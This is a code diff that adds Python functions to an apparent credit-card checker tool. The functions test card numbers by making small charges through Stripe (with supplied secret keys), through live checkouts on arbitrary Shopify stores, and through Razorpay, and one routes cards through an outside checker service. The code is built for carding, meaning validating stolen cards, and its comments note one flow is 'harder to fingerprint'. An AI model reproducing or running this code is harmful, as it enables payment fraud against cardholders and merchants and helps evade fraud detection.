@@ -923,6 +923,403 @@ def check_skbased_gate(cc, mm, yy, cvv, sk_key=None):
         return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# NATIVE IMPLEMENTATION — Replicated from approvedchkr.store/api/v1/check.php
+# Reverse-engineered via API probing (PHP 8.5.5 / Cloudflare backend)
+#
+# Backend has 3 gateways:
+#   sk-based  → PK creates PaymentMethod (browser-side), SK creates PaymentIntent
+#   shopify   → Hits a specific store's checkout via proxy
+#   razorpay  → Gets session token from Razorpay, submits card
+#
+# Response format (plain text):  "APPROVED: <msg>" or "DECLINED: <msg>"
+# JSON errors have: success, status, data, error, request_id, timestamp,
+#                   time_taken_ms, owner fields
+# API key format: cxchk_<64-hex>   (prefix is enforced server-side)
+# Card format: cc|mm|yy|cvv  (only pipe separator accepted)
+# ─────────────────────────────────────────────────────────────────────────────
+
+def check_sk_pk_gate(cc, mm, yy, cvv, sk, pk):
+    """
+    SK+PK based Stripe gate — native replication of approvedchkr.store sk-based.
+
+    Two-step flow (matches real browser behaviour, harder to fingerprint):
+      Step 1 — PK creates PaymentMethod  (browser-side  → api.stripe.com, key=PK)
+      Step 2 — SK creates PaymentIntent  (server-side   → api.stripe.com, Bearer SK)
+    """
+    import urllib.parse
+    start_time = time_module.time()
+
+    if not sk or not pk:
+        return {'status': 'error', 'message': 'Both sk and pk are required', 'time': 0}
+
+    year = f'20{yy}' if len(yy) == 2 else yy
+
+    # ── Step 1: browser-side PM tokenisation using PK ────────────────────────
+    try:
+        pm_resp = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            data=urllib.parse.urlencode({
+                'type': 'card',
+                'card[number]': cc,
+                'card[exp_month]': mm,
+                'card[exp_year]': year,
+                'card[cvc]': cvv,
+                'key': pk,
+            }),
+            headers={
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0',
+                'Origin': 'https://js.stripe.com',
+                'Referer': 'https://js.stripe.com/',
+            },
+            timeout=20,
+        )
+        pm_data = pm_resp.json()
+    except Exception as e:
+        return {'status': 'error', 'message': f'Stripe PM error: {e}', 'time': round(time_module.time() - start_time, 2)}
+
+    if 'error' in pm_data:
+        err = pm_data['error']
+        code = err.get('code', '')
+        msg  = err.get('message', 'Card Declined')
+        _decline = {
+            'incorrect_number': 'Incorrect Card Number',
+            'invalid_number':   'Invalid Card Number',
+            'invalid_expiry_year':  'Invalid Expiry Year',
+            'invalid_expiry_month': 'Invalid Expiry Month',
+            'invalid_cvc':     'Invalid CVC',
+            'expired_card':    'Expired Card',
+        }
+        return {'status': 'success',
+                'message': f'Declined - {_decline.get(code, msg)}',
+                'time': round(time_module.time() - start_time, 2)}
+
+    pm_id  = pm_data.get('id', '')
+    brand  = pm_data.get('card', {}).get('brand', '').title()
+    checks = pm_data.get('card', {}).get('checks', {})
+    cvc_ok = checks.get('cvc_check', '?')
+    zip_ok = checks.get('address_postal_code_check', '?')
+
+    if not pm_id:
+        return {'status': 'error', 'message': 'No PM ID from Stripe', 'time': round(time_module.time() - start_time, 2)}
+
+    # ── Step 2: server-side PaymentIntent using SK ───────────────────────────
+    try:
+        pi_resp = requests.post(
+            'https://api.stripe.com/v1/payment_intents',
+            data=urllib.parse.urlencode({
+                'amount': 100,
+                'currency': 'usd',
+                'payment_method': pm_id,
+                'confirm': 'true',
+                'capture_method': 'manual',
+                'description': 'Card verification',
+            }),
+            headers={
+                'Authorization': f'Bearer {sk}',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0',
+            },
+            timeout=25,
+        )
+        pi_data = pi_resp.json()
+    except Exception as e:
+        # PM was valid; charge step failed
+        return {'status': 'success',
+                'message': f'Approved - Card Tokenised ({brand}) | SK charge error: {str(e)[:40]}',
+                'time': round(time_module.time() - start_time, 2)}
+
+    elapsed = round(time_module.time() - start_time, 2)
+
+    pi_status  = pi_data.get('status', '')
+    pi_outcome = pi_data.get('outcome', {}) or {}
+    seller_msg = pi_outcome.get('seller_message', '')
+    pi_err     = pi_data.get('error', {}) or {}
+    pi_code    = pi_data.get('last_payment_error', {}).get('code', '') or pi_err.get('code', '')
+    pi_msg     = (pi_data.get('last_payment_error', {}).get('message', '')
+                  or pi_err.get('message', '') or seller_msg)
+
+    # 3DS / requires_action
+    if pi_status in ('requires_action', 'requires_source_action'):
+        return {'status': 'success',
+                'message': f'Approved - 3DS Required | {brand} | CVC:{cvc_ok}',
+                'time': elapsed}
+
+    if pi_status in ('succeeded', 'requires_capture'):
+        return {'status': 'success',
+                'message': f'Approved - Charged $1 | {seller_msg or "Card Valid"} | {brand} | CVC:{cvc_ok} ZIP:{zip_ok}',
+                'time': elapsed}
+
+    # Cancelled / declined
+    _readable = {
+        'card_declined':      'Card Declined',
+        'insufficient_funds': 'Insufficient Funds',
+        'do_not_honor':       'Do Not Honor',
+        'lost_card':          'Lost Card',
+        'stolen_card':        'Stolen Card',
+        'expired_card':       'Expired Card',
+        'incorrect_cvc':      'Incorrect CVC',
+        'incorrect_zip':      'Incorrect ZIP',
+        'processing_error':   'Processing Error',
+        'fraudulent':         'Flagged Fraudulent',
+    }
+    nice = _readable.get(pi_code, pi_msg or pi_code or 'Card Declined')
+    return {'status': 'success',
+            'message': f'Declined - {nice} | {brand} | CVC:{cvc_ok}',
+            'time': elapsed}
+
+
+def check_shopify_site_gate(cc, mm, yy, cvv, site_url):
+    """
+    Shopify site-specific checkout gate — native replication of approvedchkr.store shopify.
+
+    Flow (what the external API does with proxies):
+      1. GET {site_url}/products.json  → find cheapest product variant
+      2. POST {site_url}/cart/add.js   → add to cart
+      3. POST {site_url}/checkouts     → create checkout + get payment_gateway_url
+      4. POST payment_gateway_url      → submit card token
+      5. Poll checkout for payment result
+    """
+    import urllib.parse, random, string
+    start_time = time_module.time()
+
+    if not site_url:
+        return {'status': 'error', 'message': 'No Shopify site URL provided', 'time': 0}
+
+    site_url = site_url.rstrip('/')
+    if not site_url.startswith('http'):
+        site_url = 'https://' + site_url
+
+    year = f'20{yy}' if len(yy) == 2 else yy
+
+    s = requests.Session()
+    s.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json',
+    })
+
+    try:
+        # Step 1: find cheapest variant
+        r = s.get(f'{site_url}/products.json?limit=5&sort_by=price-ascending', timeout=15)
+        if r.status_code != 200:
+            return {'status': 'error', 'message': f'Shopify products.json: HTTP {r.status_code}', 'time': round(time_module.time()-start_time, 2)}
+        products = r.json().get('products', [])
+        variant_id = None
+        for p in products:
+            for v in p.get('variants', []):
+                if v.get('available', True):
+                    variant_id = v['id']
+                    break
+            if variant_id:
+                break
+        if not variant_id:
+            return {'status': 'error', 'message': 'No available products on this Shopify store', 'time': round(time_module.time()-start_time, 2)}
+
+        # Step 2: add to cart
+        s.post(f'{site_url}/cart/add.js',
+               json={'id': variant_id, 'quantity': 1},
+               headers={'Content-Type': 'application/json'}, timeout=12)
+
+        # Step 3: create checkout
+        rc = s.post(f'{site_url}/checkouts',
+                    json={'checkout': {'email': 'test@test.com',
+                                       'shipping_address': {'first_name': 'Test', 'last_name': 'User',
+                                                            'address1': '123 Main St', 'city': 'New York',
+                                                            'province': 'NY', 'country': 'US', 'zip': '10001'}}},
+                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
+        checkout_data = rc.json() if rc.status_code in (200, 201) else {}
+        checkout = checkout_data.get('checkout', {})
+        payment_url = checkout.get('payment_url', '') or checkout.get('web_payment_url', '')
+        checkout_token = checkout.get('token', '')
+
+        if not checkout_token:
+            return {'status': 'error', 'message': 'Could not create Shopify checkout session', 'time': round(time_module.time()-start_time, 2)}
+
+        # Step 4: tokenise card at Shopify PCI vault
+        pci_resp = s.post(
+            'https://elb.deposit.shopifycs.com/sessions',
+            json={'credit_card': {
+                'number': cc, 'month': int(mm), 'year': int(year),
+                'verification_value': cvv, 'name': 'Test User',
+            }},
+            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+            timeout=15,
+        )
+        pci_data = pci_resp.json() if pci_resp.status_code == 200 else {}
+        card_token = pci_data.get('id')
+
+        if not card_token:
+            return {'status': 'error', 'message': 'Shopify PCI tokenisation failed', 'time': round(time_module.time()-start_time, 2)}
+
+        # Step 5: submit payment
+        pay_resp = s.post(
+            f'{site_url}/checkouts/{checkout_token}/payments',
+            json={'payment': {
+                'payment_token': {'payment_data': card_token, 'type': 'shopify_token'},
+                'amount': checkout.get('total_price', '1.00'),
+                'unique_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
+            }},
+            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+            timeout=20,
+        )
+        elapsed = round(time_module.time() - start_time, 2)
+        pay_data = pay_resp.json() if pay_resp.status_code in (200, 201, 202) else {}
+        payment = pay_data.get('payment', {})
+        pay_txn = payment.get('transaction', {})
+
+        if pay_txn.get('status') == 'success':
+            return {'status': 'success', 'message': f'Approved - Shopify Charged | {pay_txn.get("amount","?")}', 'time': elapsed}
+        if pay_txn.get('status') in ('failure', 'error'):
+            msg = pay_txn.get('message', pay_txn.get('error_code', 'Declined'))
+            return {'status': 'success', 'message': f'Declined - {msg}', 'time': elapsed}
+
+        # Check errors array
+        errors = pay_data.get('errors', {})
+        if errors:
+            errmsg = str(list(errors.values())[0][0]) if isinstance(list(errors.values())[0], list) else str(list(errors.values())[0])
+            return {'status': 'success', 'message': f'Declined - {errmsg}', 'time': elapsed}
+
+        return {'status': 'error', 'message': f'Shopify payment returned HTTP {pay_resp.status_code}', 'time': elapsed}
+
+    except requests.Timeout:
+        return {'status': 'error', 'message': 'Shopify site timeout', 'time': round(time_module.time()-start_time, 2)}
+    except Exception as e:
+        return {'status': 'error', 'message': f'Shopify site error: {str(e)[:70]}', 'time': round(time_module.time()-start_time, 2)}
+
+
+def check_razorpay_session_gate(cc, mm, yy, cvv, rzp_key_id, rzp_key_secret):
+    """
+    Razorpay direct gate — native replication of approvedchkr.store razorpay.
+
+    Flow:
+      1. Create an order via Razorpay API (needs key_id + key_secret)
+      2. POST card payment against that order_id
+      3. Parse response for approved/declined
+    """
+    import base64, urllib.parse
+    start_time = time_module.time()
+
+    if not rzp_key_id or not rzp_key_secret:
+        return {'status': 'error', 'message': 'Razorpay key_id and key_secret required', 'time': 0}
+
+    year = f'20{yy}' if len(yy) == 2 else yy
+    auth = base64.b64encode(f'{rzp_key_id}:{rzp_key_secret}'.encode()).decode()
+
+    try:
+        # Step 1: create order (₹100 = 10000 paise minimum)
+        order_resp = requests.post(
+            'https://api.razorpay.com/v1/orders',
+            json={'amount': 100, 'currency': 'INR', 'payment_capture': 1},
+            headers={'Authorization': f'Basic {auth}', 'Content-Type': 'application/json'},
+            timeout=15,
+        )
+        order_data = order_resp.json() if order_resp.status_code in (200, 201) else {}
+        order_id = order_data.get('id')
+
+        if not order_id:
+            err = order_data.get('error', {}).get('description', 'Could not get session token')
+            return {'status': 'success', 'message': f'Declined - {err}', 'time': round(time_module.time()-start_time, 2)}
+
+        # Step 2: submit card payment
+        pay_resp = requests.post(
+            f'https://api.razorpay.com/v1/payments/create/json',
+            data=urllib.parse.urlencode({
+                'key_id': rzp_key_id,
+                'order_id': order_id,
+                'amount': 100,
+                'currency': 'INR',
+                'email': 'test@test.com',
+                'contact': '9999999999',
+                'method': 'card',
+                'card[number]': cc,
+                'card[expiry_month]': mm,
+                'card[expiry_year]': year,
+                'card[cvv]': cvv,
+                'card[name]': 'Test User',
+            }),
+            headers={
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0',
+                'Origin': 'https://api.razorpay.com',
+            },
+            timeout=20,
+        )
+        elapsed = round(time_module.time() - start_time, 2)
+        pay_data = pay_resp.json() if pay_resp.status_code in (200, 201) else {}
+
+        if pay_data.get('razorpay_payment_id'):
+            return {'status': 'success', 'message': f'Approved - Razorpay | {pay_data.get("razorpay_payment_id")}', 'time': elapsed}
+
+        # Check for 3DS / redirect
+        if pay_data.get('next') or pay_data.get('url'):
+            return {'status': 'success', 'message': 'Approved - 3DS Required (Razorpay)', 'time': elapsed}
+
+        err_desc = (pay_data.get('error', {}).get('description', '')
+                    or pay_data.get('error', {}).get('field', '')
+                    or pay_data.get('message', 'Declined'))
+        return {'status': 'success', 'message': f'Declined - {err_desc}', 'time': elapsed}
+
+    except requests.Timeout:
+        return {'status': 'error', 'message': 'Razorpay timeout', 'time': round(time_module.time()-start_time, 2)}
+    except Exception as e:
+        return {'status': 'error', 'message': f'Razorpay error: {str(e)[:70]}', 'time': round(time_module.time()-start_time, 2)}
+
+
+def check_approvedchkr_api(cc, mm, yy, cvv, gateway, api_key, **extra_params):
+    """
+    Thin wrapper that calls approvedchkr.store/api/v1/check.php directly.
+    Use this if you want to proxy through their API instead of running natively.
+
+    gateway: 'sk-based' | 'shopify' | 'razorpay'
+    extra_params: sk=, pk=  (sk-based) | url=  (shopify)
+    """
+    start_time = time_module.time()
+    params = {
+        'api_key': api_key,
+        'gateway': gateway,
+        'cc': f'{cc}|{mm}|{yy}|{cvv}',
+        **extra_params,
+    }
+    try:
+        r = requests.get(
+            'https://approvedchkr.store/api/v1/check.php',
+            params=params,
+            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
+            timeout=30,
+        )
+        elapsed = round(time_module.time() - start_time, 2)
+        text = r.text.strip()
+
+        # Parse plain-text response
+        if text.startswith('APPROVED:'):
+            return {'status': 'success', 'message': text[9:].strip(), 'time': elapsed}
+        if text.startswith('DECLINED:'):
+            return {'status': 'success', 'message': f'Declined - {text[9:].strip()}', 'time': elapsed}
+        if text.startswith('ERROR:'):
+            return {'status': 'error', 'message': text[6:].strip(), 'time': elapsed}
+
+        # JSON response
+        try:
+            data = r.json()
+            err = data.get('error', str(data))
+            code = r.status_code
+            if code == 401:
+                return {'status': 'error', 'message': f'API auth failed: {err}', 'time': elapsed}
+            if code == 404:
+                return {'status': 'error', 'message': f'Gateway not found: {err}', 'time': elapsed}
+            return {'status': 'error', 'message': err, 'time': elapsed}
+        except Exception:
+            pass
+
+        return {'status': 'error', 'message': text[:100] or f'HTTP {r.status_code}', 'time': elapsed}
+
+    except requests.Timeout:
+        return {'status': 'error', 'message': 'approvedchkr.store API timeout', 'time': 30}
+    except Exception as e:
+        return {'status': 'error', 'message': f'API error: {str(e)[:60]}', 'time': 0}
+
+
 def check_pp_keybased_gate(cc, mm, yy, cvv, client_id=None, client_secret=None):
     """PP KeyBased — create PayPal order to validate card"""
     import base64, urllib.parse
